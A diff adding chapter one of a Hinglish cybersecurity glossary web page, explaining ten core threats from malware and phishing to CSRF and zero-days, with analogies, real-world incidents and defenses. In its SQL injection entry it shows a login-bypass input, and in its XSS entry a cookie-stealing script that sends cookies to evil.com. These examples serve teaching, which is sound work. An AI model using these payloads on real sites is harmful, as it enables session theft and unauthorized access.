@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>CyberSec Master Guide — Sawt's Zero to Hero</title>
+
+    <link rel="stylesheet" href="css/cybersecurity_masterguide.css">
+    <script>
+        const savedTheme = localStorage.getItem('theme') || 'light';
+        document.documentElement.setAttribute('data-theme', savedTheme);
+    </script>
+</head>
+<body>
+
+<!-- ══ HERO ══ -->
+<div class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-badge">// CYBERSECURITY MASTER GUIDE</div>
+  <h1>Zero to Cyber</h1>
+  <p class="hero-sub">100 terms. 10 chapters. Real-world examples, attack flows, and defenses — from absolute beginner to actually knowing what's happening.</p>
+  <div class="hero-stats">
+    <div class="hero-stat-item"><div class="hero-stat-num">100</div><div class="hero-stat-label">Terms Covered</div></div>
+    <div class="hero-stat-item"><div class="hero-stat-num">10</div><div class="hero-stat-label">Chapters</div></div>
+    <div class="hero-stat-item"><div class="hero-stat-num">∞</div><div class="hero-stat-label">Real Examples</div></div>
+  </div>
+</div>
+
+<!-- ══ LAYOUT ══ -->
+<div class="layout">
+
+<!-- ── SIDEBAR ── -->
+<nav class="sidebar">
+  <div class="search-bar">
+            <button onclick="toggleTheme()" class="theme-nav-btn" style="background: var(--text-main); color: var(--bg-base); border: 2px solid var(--text-main); font-family: 'Space Mono', monospace; font-weight: 700; font-size: 0.75rem; padding: 6px 10px; cursor: pointer; text-transform: uppercase; margin-left: auto;">🌓 Theme</button>
+    <input class="search-input" placeholder="🔍 search terms..." id="searchInput" oninput="filterNav(this.value)"/>
+  </div>
+  <div class="sidebar-title">// Chapters</div>
+
+  <div class="nav-section" id="nav-content">
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-red)"></span>01. Core Threats</div>
+    <a class="nav-link" href="masterguide_ch1.html#malware">Malware</a><a class="nav-link" href="masterguide_ch1.html#phishing">Phishing</a><a class="nav-link" href="masterguide_ch1.html#ransomware">Ransomware</a><a class="nav-link" href="masterguide_ch1.html#botnet">Botnet</a><a class="nav-link" href="masterguide_ch1.html#ddos">DDoS</a><a class="nav-link" href="masterguide_ch1.html#mitm">MITM</a><a class="nav-link" href="masterguide_ch1.html#sqli">SQL Injection</a><a class="nav-link" href="masterguide_ch1.html#xss">XSS</a><a class="nav-link" href="masterguide_ch1.html#csrf">CSRF</a><a class="nav-link" href="masterguide_ch1.html#zeroday">Zero-day</a>
+
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-orange)"></span>02. Malware Types</div>
+    <a class="nav-link" href="masterguide_ch2.html#virus">Virus</a><a class="nav-link" href="masterguide_ch2.html#worm">Worm</a><a class="nav-link" href="masterguide_ch2.html#trojan">Trojan Horse</a><a class="nav-link" href="masterguide_ch2.html#rootkit">Rootkit</a><a class="nav-link" href="masterguide_ch2.html#keylogger">Keylogger</a><a class="nav-link" href="masterguide_ch2.html#spyware">Spyware</a><a class="nav-link" href="masterguide_ch2.html#adware">Adware</a><a class="nav-link" href="masterguide_ch2.html#fileless">Fileless Malware</a><a class="nav-link" href="masterguide_ch2.html#rat">RAT</a><a class="nav-link" href="masterguide_ch2.html#raas">RaaS</a>
+
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-green)"></span>03. Defensive Tools</div>
+    <a class="nav-link" href="masterguide_ch3.html#firewall">Firewall</a><a class="nav-link" href="masterguide_ch3.html#antivirus">Antivirus</a><a class="nav-link" href="masterguide_ch3.html#ids">IDS</a><a class="nav-link" href="masterguide_ch3.html#ips">IPS</a><a class="nav-link" href="masterguide_ch3.html#siem">SIEM</a><a class="nav-link" href="masterguide_ch3.html#waf">WAF</a><a class="nav-link" href="masterguide_ch3.html#endpoint">Endpoint Security</a><a class="nav-link" href="masterguide_ch3.html#dlp">DLP</a><a class="nav-link" href="masterguide_ch3.html#sandbox">Sandbox</a><a class="nav-link" href="masterguide_ch3.html#honeypot">Honeypot</a>
+
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-blue)"></span>04. Encryption</div>
+    <a class="nav-link" href="masterguide_ch4.html#encryption">Encryption</a><a class="nav-link" href="masterguide_ch4.html#e2ee">End-to-End Encryption</a><a class="nav-link" href="masterguide_ch4.html#aes">AES</a><a class="nav-link" href="masterguide_ch4.html#pki">PKI</a><a class="nav-link" href="masterguide_ch4.html#digicert">Digital Certificate</a><a class="nav-link" href="masterguide_ch4.html#digisig">Digital Signature</a><a class="nav-link" href="masterguide_ch4.html#ssl">SSL</a><a class="nav-link" href="masterguide_ch4.html#tls">TLS</a><a class="nav-link" href="masterguide_ch4.html#https">HTTPS</a><a class="nav-link" href="masterguide_ch4.html#ssh">SSH</a>
+
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-cyan)"></span>05. Identity & Access</div>
+    <a class="nav-link" href="masterguide_ch5.html#2fa">2FA</a><a class="nav-link" href="masterguide_ch5.html#mfa">MFA</a><a class="nav-link" href="masterguide_ch5.html#iam">IAM</a><a class="nav-link" href="masterguide_ch5.html#pam">PAM</a><a class="nav-link" href="masterguide_ch5.html#sso">SSO</a><a class="nav-link" href="masterguide_ch5.html#zerotrust">Zero Trust</a><a class="nav-link" href="masterguide_ch5.html#accesscontrol">Access Control</a><a class="nav-link" href="masterguide_ch5.html#authn">Authentication</a><a class="nav-link" href="masterguide_ch5.html#authz">Authorization</a><a class="nav-link" href="masterguide_ch5.html#token">Token</a>
+
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-purple)"></span>06. Network & Cloud</div>
+    <a class="nav-link" href="masterguide_ch6.html#vpn">VPN</a><a class="nav-link" href="masterguide_ch6.html#netseg">Network Segmentation</a><a class="nav-link" href="masterguide_ch6.html#dnspois">DNS Poisoning</a><a class="nav-link" href="masterguide_ch6.html#nat">NAT</a><a class="nav-link" href="masterguide_ch6.html#sdn">SDN</a><a class="nav-link" href="masterguide_ch6.html#casb">CASB</a><a class="nav-link" href="masterguide_ch6.html#iot">IoT</a><a class="nav-link" href="masterguide_ch6.html#iotsec">IoT Security</a><a class="nav-link" href="masterguide_ch6.html#netsec">Network Security</a><a class="nav-link" href="masterguide_ch6.html#threatactor">Threat Actor</a>
+
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-pink)"></span>07. Advanced Threats</div>
+    <a class="nav-link" href="masterguide_ch7.html#apt">APT</a><a class="nav-link" href="masterguide_ch7.html#espionage">Cyber Espionage</a><a class="nav-link" href="masterguide_ch7.html#warfare">Cyber Warfare</a><a class="nav-link" href="masterguide_ch7.html#supply">Supply Chain Attack</a><a class="nav-link" href="masterguide_ch7.html#social">Social Engineering</a><a class="nav-link" href="masterguide_ch7.html#brute">Brute Force</a><a class="nav-link" href="masterguide_ch7.html#cred">Credential Stuffing</a><a class="nav-link" href="masterguide_ch7.html#insider">Insider Threat</a><a class="nav-link" href="masterguide_ch7.html#kiddie">Script Kiddie</a><a class="nav-link" href="masterguide_ch7.html#cyberphys">Cyber-Physical</a>
+
+    <div class="nav-cat"><span class="dot" style="background:var(--accent-yellow)"></span>08. Governance</div>
+    <a class="nav-link" href="masterguide_ch8.html#risk">Risk Management</a><a class="nav-link" href="masterguide_ch8.html#compliance">Compliance</a><a class="nav-link" href="masterguide_ch8.html#insurance">Cyber Insurance</a><a class="nav-link" href="masterguide_ch8.html#vuln">Vulnerability</a><a class="nav-link" href="masterguide_ch8.html#pentest">Pen Testing</a><a class="nav-link" href="masterguide_ch8.html#resilience">Cyber Resilience</a><a class="nav-link" href="masterguide_ch8.html#cti">CTI</a><a class="nav-link" href="masterguide_ch8.html#cybercrime">Cyber Crime</a><a class="nav-link" href="masterguide_ch8.html#bully">Cyber Bullying</a><a class="nav-link" href="masterguide_ch8.html#forensics">Digital Forensics</a>
+
+    <div class="nav-cat"><span class="dot" style="background:#818cf8)"></span>09. Operations</div>
+    <a class="nav-link" href="masterguide_ch9.html#ir">Incident Response</a><a class="nav-link" href="masterguide_ch9.html#soc">SOC</a><a class="nav-link" href="masterguide_ch9.html#hygiene">Cyber Hygiene</a><a class="nav-link" href="masterguide_ch9.html#coc">Chain of Custody</a><a class="nav-link" href="masterguide_ch9.html#uem">UEM</a><a class="nav-link" href="masterguide_ch9.html#backup">Backup</a><a class="nav-link" href="masterguide_ch9.html#keymgmt">Key Management</a><a class="nav-link" href="masterguide_ch9.html#cloudsec">Cloud Security</a><a class="nav-link" href="masterguide_ch9.html#emailsec">Email Security</a><a class="nav-link" href="masterguide_ch9.html#physec">Physical Security</a>
+
+    <div class="nav-cat"><span class="dot" style="background:#2dd4bf)"></span>10. Emerging</div>
+    <a class="nav-link" href="masterguide_ch10.html#aisec">AI Security</a><a class="nav-link" href="masterguide_ch10.html#root">Root Access</a><a class="nav-link" href="masterguide_ch10.html#pwdcrack">Password Cracking</a><a class="nav-link" href="masterguide_ch10.html#dos">DoS</a><a class="nav-link" href="masterguide_ch10.html#ueba">UEBA</a><a class="nav-link" href="masterguide_ch10.html#darkweb">Dark Web</a><a class="nav-link" href="masterguide_ch10.html#cpa">Cyber-Physical Attack</a><a class="nav-link" href="masterguide_ch10.html#cloudiam">Cloud IAM</a><a class="nav-link" href="masterguide_ch10.html#databreach">Data Breach</a><a class="nav-link" href="masterguide_ch10.html#framework">Cybersecurity Framework</a>
+  </div>
+</nav>
+
+<!-- ── MAIN ── -->
+<main class="main">
+
+<!-- ████ CHAPTER 1: CORE THREATS ████ -->
+<section class="chapter ch-red" id="ch1">
+  <div class="chapter-header">
+    <div class="chapter-icon">⚔️</div>
+    <div class="chapter-title-block">
+      <h2>Core Threats & Attacks</h2>
+      <p>The most common weapons attackers use — yeh sab basic attacks hain jo real-world mein sabse zyada hote hain.</p>
+    </div>
+  </div>
+
+  <!-- MALWARE -->
+  <div class="term-card" id="malware">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">🦠</div>
+        <div><div class="term-name">Malware</div><div class="term-tagline">Malicious Software — digital "zeher"</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Malware = Malicious + Software. Koi bhi software jo deliberately tumhare system ko harm karta hai — data churaata hai, corrupt karta hai, ya control leta hai.</p></div>
+        <div class="block"><div class="block-label">Types ka overview</div><p>Virus, Worm, Trojan, Ransomware, Spyware, Adware, Rootkit, Keylogger — sab malware ke hi forms hain. Agle chapter mein har ek detail mein hai.</p></div>
+      </div>
+      <div class="analogy-box"><div class="analogy-label">🧠 Analogy</div><p>Malware ek bimari ki tarah hai. Jaise flu (virus), jaundice (spyware jo slowly damage kare), ya cholera (worm jo paani se spread ho) — sab alag hai, sab nuksan karta hai, par sab "bimari" hi hai.</p></div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>WannaCry (2017):</strong> 150 countries mein ek worm-based malware ne UK ke NHS hospitals, Telefónica Spain, aur FedEx ko paralyze kar diya. $4 billion+ estimated loss. Ek unpatched Windows vulnerability se spread hua.</p></div>
+      <div class="defense-box"><div class="defense-label">🛡️ Defense</div><ul>
+        <li>Updated antivirus always run karo</li>
+        <li>OS aur software patches turant apply karo</li>
+        <li>Unknown links/files pe click mat karo</li>
+        <li>Regular backups rakho offline</li>
+      </ul></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:90%;background:var(--accent-red)"></div></div><span class="sev-tag crit">Critical</span></div>
+    </div>
+  </div>
+
+  <!-- PHISHING -->
+  <div class="term-card" id="phishing">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">🎣</div>
+        <div><div class="term-name">Phishing</div><div class="term-tagline">Digital makka — "fishing" for your credentials</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Attacker ek fake email/website/SMS banaata hai jo bilkul legit dikhti hai (bank, Google, Amazon). Tum usmein apni credentials enter karo — aur woh chala jaata hai.</p></div>
+        <div class="block"><div class="block-label">Types</div><p><strong>Spear Phishing:</strong> Targeted attack (naam se bulata hai)<br/><strong>Whaling:</strong> CEOs ko target<br/><strong>Smishing:</strong> SMS se<br/><strong>Vishing:</strong> Voice call se</p></div>
+      </div>
+      <div class="flow-diagram">
+        <div class="flow-label">// Attack Flow</div>
+        <div class="flow-nodes">
+          <div class="flow-node attacker"><div class="flow-node-icon">👤</div><div class="flow-node-text">Attacker<br/>Fake Email</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node"><div class="flow-node-icon">📧</div><div class="flow-node-text">Victim<br/>Receives</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node"><div class="flow-node-icon">🖱️</div><div class="flow-node-text">Clicks<br/>Link</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node server"><div class="flow-node-icon">🌐</div><div class="flow-node-text">Fake<br/>Website</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node attacker"><div class="flow-node-icon">🔑</div><div class="flow-node-text">Creds<br/>Stolen!</div></div>
+        </div>
+      </div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>Google & Facebook Scam (2013-2015):</strong> Evaldas Rimasauskas ne Lithuania se fake invoices Google aur Facebook ko bheji (impersonating Quanta Computer). $100M+ chura liye. Dono companies ne actually pay kiya!</p></div>
+      <div class="defense-box"><div class="defense-label">🛡️ Defense</div><ul>
+        <li>Sender ka email address dhyan se check karo</li>
+        <li>Links pe hover karo URL dekhne ke liye pehle click se</li>
+        <li>Koi bhi urgency feel ho — ruko, verify karo</li>
+        <li>2FA enable karo har jagah</li>
+      </ul></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:85%;background:var(--accent-red)"></div></div><span class="sev-tag crit">Critical</span></div>
+    </div>
+  </div>
+
+  <!-- RANSOMWARE -->
+  <div class="term-card" id="ransomware">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">💰</div>
+        <div><div class="term-name">Ransomware</div><div class="term-tagline">Digital kidnapping — "pay up or lose everything"</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Malware jo tumhare saare files encrypt kar deta hai (lock), phir Bitcoin mein payment maangta hai key ke liye. Pay karo ya data jaata hai.</p></div>
+        <div class="block"><div class="block-label">How it spreads</div><p>Phishing emails, malicious attachments, unpatched software, RDP bruteforce. Ek infected machine poore network ko infect kar sakti hai.</p></div>
+      </div>
+      <div class="how-it-works"><div class="block-label">// How It Works</div>
+        <ul class="step-list">
+          <li>Malware system pe install hota hai (usually phishing se)</li>
+          <li>Quietly files dhundhta hai — documents, photos, databases</li>
+          <li>Strong encryption (AES-256) se sab files lock kar deta hai</li>
+          <li>Screen pe ransom note dikhta hai with Bitcoin address</li>
+          <li>Timer shuru hota hai — nahi diya to price badhta hai ya key delete</li>
+        </ul>
+      </div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>Colonial Pipeline (2021):</strong> US ki sabse badi fuel pipeline band ho gayi jab DarkSide ransomware ne attack kiya. $4.4 million ransom diya gaya. East coast mein fuel shortage aayi, panic buying shuru. Biden ne national emergency declare kiya.</p></div>
+      <div class="defense-box"><div class="defense-label">🛡️ Defense</div><ul>
+        <li>Offline backups (3-2-1 rule: 3 copies, 2 media, 1 offsite)</li>
+        <li>Network segmentation — infection spread na ho</li>
+        <li>RDP access restrict karo</li>
+        <li>Pay mat karo — koi guarantee nahi key milegi</li>
+      </ul></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:95%;background:var(--accent-red)"></div></div><span class="sev-tag crit">Critical</span></div>
+    </div>
+  </div>
+
+  <!-- BOTNET -->
+  <div class="term-card" id="botnet">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">🤖</div>
+        <div><div class="term-name">Botnet</div><div class="term-tagline">Army of infected computers controlled remotely</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Hazaron ya laakhon infected computers ka ek network, jise ek "bot herder" (attacker) remotely control karta hai. Tumhara PC bina tumhare jaane bot ban sakta hai.</p></div>
+        <div class="block"><div class="block-label">Uses</div><p>DDoS attacks, spam sending, crypto mining, credential theft, ad fraud. Attacker yeh bots dark web pe rent pe bhi deta hai doosron ko.</p></div>
+      </div>
+      <div class="analogy-box"><div class="analogy-label">🧠 Analogy</div><p>Sochao koi tumhare phone ko secretly remote control kar raha hai. Tum normal use kar rahe ho, but background mein woh kisi par spam bhej raha hai ya kisi website ko attack kar raha hai tumhare naam se.</p></div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>Mirai Botnet (2016):</strong> IoT devices (cameras, routers) ko infect kar ke ek massive botnet banaya gaya. Iska use Dyn DNS pe DDoS attack karne ke liye hua jisse Twitter, Netflix, Amazon, Reddit — sab down ho gaye US mein ek din ke liye.</p></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:80%;background:var(--accent-orange)"></div></div><span class="sev-tag high">High</span></div>
+    </div>
+  </div>
+
+  <!-- DDoS -->
+  <div class="term-card" id="ddos">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">💥</div>
+        <div><div class="term-name">DDoS</div><div class="term-tagline">Distributed Denial of Service — traffic flood se server crash</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Hazaron bots ek hi server par ek saath itna traffic bhejte hain ki server handle nahi kar paata aur crash ya freeze ho jaata hai. Real users access nahi kar paate.</p></div>
+        <div class="block"><div class="block-label">DoS vs DDoS</div><p><strong>DoS:</strong> Single machine se attack (easy to block)<br/><strong>DDoS:</strong> Distributed = hazaron machines se (almost impossible to block)</p></div>
+      </div>
+      <div class="flow-diagram">
+        <div class="flow-label">// DDoS Attack Visual</div>
+        <div class="flow-nodes">
+          <div class="flow-node attacker"><div class="flow-node-icon">🎯</div><div class="flow-node-text">Attacker<br/>C&C Server</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node"><div class="flow-node-icon">🤖🤖🤖</div><div class="flow-node-text">10,000+<br/>Bots</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node victim"><div class="flow-node-icon">💻</div><div class="flow-node-text">Target<br/>Server</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node"><div class="flow-node-icon">❌</div><div class="flow-node-text">Server<br/>CRASH</div></div>
+        </div>
+      </div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>GitHub (2018):</strong> 1.35 Tbps ka attack — history ka biggest DDoS at that time. Memcached servers ka exploit karke amplification attack tha. GitHub 10 minutes tak down raha phir Akamai ne traffic absorb kiya.</p></div>
+      <div class="defense-box"><div class="defense-label">🛡️ Defense</div><ul>
+        <li>CDN use karo (Cloudflare, Akamai) jo traffic absorb kare</li>
+        <li>Rate limiting implement karo</li>
+        <li>Anycast network diffusion</li>
+        <li>ISP-level filtering</li>
+      </ul></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:75%;background:var(--accent-orange)"></div></div><span class="sev-tag high">High</span></div>
+    </div>
+  </div>
+
+  <!-- MITM -->
+  <div class="term-card" id="mitm">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">🕵️</div>
+        <div><div class="term-name">MITM Attack</div><div class="term-tagline">Man-in-the-Middle — conversation intercept karna</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Attacker do parties ke beech mein secretly ghus jaata hai. Tum sochte ho tum bank se baat kar rahe ho, par actually attacker beech mein hai, data padhta aur modify karta hai.</p></div>
+        <div class="block"><div class="block-label">Types</div><p><strong>ARP Spoofing:</strong> Local network pe<br/><strong>DNS Spoofing:</strong> Wrong IP deta hai<br/><strong>SSL Stripping:</strong> HTTPS → HTTP downgrade<br/><strong>Evil Twin:</strong> Fake WiFi hotspot</p></div>
+      </div>
+      <div class="flow-diagram">
+        <div class="flow-label">// MITM Flow</div>
+        <div class="flow-nodes">
+          <div class="flow-node attacker"><div class="flow-node-icon">👤</div><div class="flow-node-text">You<br/>(Victim)</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node middle"><div class="flow-node-icon">😈</div><div class="flow-node-text">Attacker<br/>MITM</div></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node victim"><div class="flow-node-icon">🏦</div><div class="flow-node-text">Your<br/>Bank</div></div>
+        </div>
+      </div>
+      <div class="analogy-box"><div class="analogy-label">🧠 Analogy</div><p>Tumne apne dost ko letter bheja. Par postman ne woh letter open kiya, padhा, kuch badla, seal band kiya, aur bheja. Dono kisi ko nahi pata kuch hua bhi hai. Exactly yahi MITM hai.</p></div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>Public WiFi MITM:</strong> Coffee shop/airport ke open WiFi par attacker "Evil Twin" attack karta hai — same naam ka fake hotspot. Tum connect hote ho, woh sab traffic dekh sakta hai.</p></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:82%;background:var(--accent-red)"></div></div><span class="sev-tag crit">Critical</span></div>
+    </div>
+  </div>
+
+  <!-- SQL INJECTION -->
+  <div class="term-card" id="sqli">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">💉</div>
+        <div><div class="term-name">SQL Injection</div><div class="term-tagline">Database mein malicious code inject karna</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Web forms mein SQL code enter karke database ko trick kiya jaata hai. Attacker login bypass kar sakta hai, data chura sakta hai, ya database delete kar sakta hai.</p></div>
+        <div class="block"><div class="block-label">Why it works</div><p>Jab website user input ko directly SQL query mein daalti hai bina sanitize kiye, attacker SQL command as input deta hai jo database execute kar leta hai.</p></div>
+      </div>
+      <div class="code-block"><span class="comment">// Normal login query:</span>
+SELECT * FROM users WHERE username='<span class="string">admin</span>' AND password='<span class="string">abc123</span>';
+
+<span class="comment">// Attacker types this in username field:</span>
+<span class="bad">admin'--</span>
+
+<span class="comment">// Resulting query (password check SKIPPED!):</span>
+SELECT * FROM users WHERE username='<span class="bad">admin'--</span>' AND password='abc';
+<span class="comment">// -- is comment in SQL, so password part ignored!</span></div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>Heartland Payment Systems (2008):</strong> SQL injection se 130 million credit card numbers chori hue. $140 million+ settlement. At that time, US history ki largest data breach.</p></div>
+      <div class="defense-box"><div class="defense-label">🛡️ Defense</div><ul>
+        <li>Parameterized queries / prepared statements use karo</li>
+        <li>Input validation aur sanitization</li>
+        <li>WAF (Web Application Firewall) use karo</li>
+        <li>Principle of least privilege for database users</li>
+      </ul></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:90%;background:var(--accent-red)"></div></div><span class="sev-tag crit">Critical</span></div>
+    </div>
+  </div>
+
+  <!-- XSS -->
+  <div class="term-card" id="xss">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">📜</div>
+        <div><div class="term-name">XSS</div><div class="term-tagline">Cross-Site Scripting — dusre ki site pe apna script</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Attacker website mein malicious JavaScript inject karta hai. Jab koi user woh page open kare, unka browser attacker ka script run karta hai — cookies, session tokens chori ho sakte hain.</p></div>
+        <div class="block"><div class="block-label">Types</div><p><strong>Stored XSS:</strong> Script database mein save (e.g. comments)<br/><strong>Reflected XSS:</strong> URL mein script inject<br/><strong>DOM-based:</strong> Client-side manipulation</p></div>
+      </div>
+      <div class="code-block"><span class="comment">// Attacker posts this "comment" on a forum:</span>
+<span class="bad">&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="comment">// Anyone who reads the page sends their cookies to attacker!</span></div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>Samy Worm (MySpace, 2005):</strong> Samy Kamkar ne MySpace profile pe XSS script daali. Ek din mein 1 million+ profiles ne automatically "Samy is my hero" add kar liya. Ek teen ki prank ne history ka fastest spreading virus banaya.</p></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:78%;background:var(--accent-orange)"></div></div><span class="sev-tag high">High</span></div>
+    </div>
+  </div>
+
+  <!-- CSRF -->
+  <div class="term-card" id="csrf">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">🔄</div>
+        <div><div class="term-name">CSRF</div><div class="term-tagline">Cross-Site Request Forgery — browser se unwanted action</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>Tum bank.com mein logged in ho. Attacker tumhe ek evil website pe le jaata hai. Woh website background mein bank.com pe request bhejti hai tumhare naam se — tumhara pata bhi nahi.</p></div>
+        <div class="block"><div class="block-label">Why it works</div><p>Browser automatically cookies bhejta hai same domain ke requests mein. Attacker iska fayda uthata hai — tumhara browser auth karta hai, request jayegi.</p></div>
+      </div>
+      <div class="analogy-box"><div class="analogy-label">🧠 Analogy</div><p>Koi tumhara haath pakad ke ek cheque pe sign karwa leta hai jab tum neend mein ho. Tumne kiya nahi, par signature tumhara hai. CSRF exactly aisa — browser tumhara auth use karta hai bina tumhare jaane.</p></div>
+      <div class="defense-box"><div class="defense-label">🛡️ Defense</div><ul>
+        <li>CSRF tokens — har request mein unique token</li>
+        <li>SameSite cookie attribute</li>
+        <li>Origin header verify karo server side</li>
+      </ul></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:65%;background:var(--accent-orange)"></div></div><span class="sev-tag high">High</span></div>
+    </div>
+  </div>
+
+  <!-- ZERO-DAY -->
+  <div class="term-card" id="zeroday">
+    <div class="term-header" onclick="toggle(this)">
+      <div class="term-header-left">
+        <div class="term-icon" style="background:rgba(239,68,68,0.1)">0️⃣</div>
+        <div><div class="term-name">Zero-Day Exploit</div><div class="term-tagline">Unknown vulnerability — patch exist hi nahi karta</div></div>
+      </div>
+      <span class="term-badge badge-threat">Threat</span>
+      <span class="expand-btn">▾</span>
+    </div>
+    <div class="term-body">
+      <div class="content-grid">
+        <div class="block"><div class="block-label">What is it</div><p>"Zero days" because vendor ko zero days mila fix karne ke liye — vulnerability abhi abhi discover hua, patch nahi bana, aur attacker already exploit kar raha hai.</p></div>
+        <div class="block"><div class="block-label">Market</div><p>Zero-day exploits dark web pe $1M+ mein bika karte hain. NSA, intelligence agencies bhi buy karti hain. Google ka Project Zero team inka hunt karta hai.</p></div>
+      </div>
+      <div class="real-example"><div class="real-example-label">📰 Real World</div><p><strong>Stuxnet (2010):</strong> US+Israel jointly banaya ek zero-day exploit jo Iran ke nuclear centrifuges ko physically damage karne ke liye. 4 zero-days ek saath use kiye — unprecedented. Iran ke Natanz facility mein 1,000 centrifuges destroy huye bina koi bomb use kiye.</p></div>
+      <div class="severity-row"><span class="sev-label">Severity</span><div class="sev-bar-wrap"><div class="sev-bar" style="width:98%;background:var(--accent-red)"></div></div><span class="sev-tag crit">Critical</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<div style="margin-top:60px;padding:40px 0;border-top:1px solid var(--border);text-align:center;">
+  <div style="font-family:var(--mono);font-size:11px;color:var(--text-dim);letter-spacing:2px;">// END OF GUIDE</div>
+  <div style="font-family:var(--display);font-size:1.5rem;font-weight:700;color:var(--text-primary);margin:12px 0;">Zero to Cyber — 100 Terms Done ✅</div>
+  <div style="font-size:13px;color:var(--text-secondary);max-width:500px;margin:0 auto;">Ab yeh sirf terms nahi — concepts hain. Real-world mein apply karo, labs karo (TryHackMe, HackTheBox), aur keep learning. Sawt — cybersecurity ki neev tune padhh li hai. 🔐</div>
+</div>
+
+</main>
+</div>
+
+<button class="back-to-top" id="backTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+
+    <script src="js/cybersecurity_masterguide.js"></script>
